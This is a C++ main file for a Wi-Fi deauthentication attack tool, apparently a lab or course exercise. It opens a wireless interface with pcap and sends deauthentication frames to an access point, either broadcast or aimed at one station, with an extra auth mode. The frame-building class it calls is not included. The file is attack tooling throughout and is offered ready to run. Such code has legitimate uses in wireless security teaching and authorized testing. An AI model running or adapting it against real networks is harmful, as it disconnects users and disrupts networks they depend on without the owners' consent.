#include <iostream>
#include "CDeauthAttack.h"

void usage()
{
    std::cerr << "syntax : deauth-attack <interface> <ap mac> [<station mac> [-auth]]" << std::endl;
    std::cerr << "sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB" << std::endl;
}

void printErrorInterface(char* strErr)
{
    std::cerr << strErr << std::endl;
    std::cerr << "Check  Interface Or Permission" << std::endl;
}

int main(int argc, char* argv[])
{
    if(argc < 3)
    {
        usage();
        return -1;
    }
    
    char* interface = argv[1];
    char strErr[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1, strErr);
    
    // 해당 인터페이스가 없거나 권한이 없는 경우우
    if(handle == nullptr)
    {
        printErrorInterface(strErr);
        return -1;
    }
    
    CDeauthenticationAttack* deauth;
    
    switch (argc)
    {
    case 3: // BroadCast
        deauth = new CDeauthenticationAttack(0);
        deauth->sendPacket(handle, argv[2], NULL, 0);
        break;
    
    case 4: // Unicast
        deauth = new CDeauthenticationAttack(1);
        deauth->sendPacket(handle, argv[2], argv[3], 1);
        break;
    
    case 5: // Auth
        if(strcmp(argv[4],"-auth"))
        {
            usage();
            return -1;
        }
        deauth = new CDeauthenticationAttack(2);
        deauth->sendPacket(handle, argv[2], argv[3], 2);
        break;
    default:
        usage();
        return -1;
    }

    return 0;
}